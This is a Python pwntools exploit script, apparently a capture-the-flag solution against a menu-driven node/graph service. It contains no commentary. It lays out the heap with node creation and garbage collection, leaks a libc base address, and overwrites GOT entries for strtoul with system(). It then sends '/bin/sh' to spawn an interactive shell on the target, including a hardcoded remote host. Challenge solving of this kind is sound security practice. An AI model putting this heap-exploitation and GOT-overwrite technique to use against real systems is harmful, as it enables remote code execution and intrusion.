from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "13.231.226.137"
    port = 9573
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, '\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip('\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil('>')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r='>'):
    recvuntil(r)
    s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)


def create_node(pred):
    rs(1)
    rs(pred)
    recvline()
    s = recvline()
    return int(s)

def connect_node(pred, succ):
    rs(2)
    rs(pred)
    rs(succ)

def disconnect_node(pred, succ):
    rs(3)
    rs(pred)
    rs(succ)

def write_text(node, length, text):
    rs(4)
    rs(node)
    rs(length)
    if length == 0:
        recvuntil('>')
        return
    rs(text.ljust(length, '\x00'), new_line=False)

def write_bin(node, length, text):
    rs(5)
    rs(node)
    rs(length)
    if length == 0:
        recvuntil('>')
        return
    rs(text.ljust(length, '\xff'), new_line=False)

def read_text(node):
    rs(6)
    rs(node)
    s = recvuntil('op')
    return s

def gc():
    rs(7)

puts_addr = 0x0000000000519080
got_strtoul = 0x0519030

def gen(gid, pid, text_id, size):
    return p64(gid) + p64(pid) + p64(got_strtoul) + p64(got_strtoul) + p64(got_strtoul + 16) + p64(size) + p64(text_id) + p64(10)


write_bin(0, 0, "a")
x = create_node(0)

s = gen(1, 1, 5, 0x1f0)
write_text(0, len(s), s)

y = create_node(0)
z = create_node(0)
write_bin(y,0x400, "A")
write_bin(z, 0x150, 'A')
create_node(0)
create_node(0)
create_node(0)
disconnect_node(0, y)
gc()

s = read_text(1)[0x1e0:][:8]
libc_base = u64(s) >> 8
libc_base -= 0x1ebbe0
print(hex(libc_base))

system = libc_base + 0x55410

write_bin(0, 0, "a")
x = create_node(0)
s = gen(system, system, 5, 0x1f0)
write_text(0, len(s), s)

wait_for_attach()
connect_node(1, system)

rs(1)
sendline('/bin/sh')

interactive()
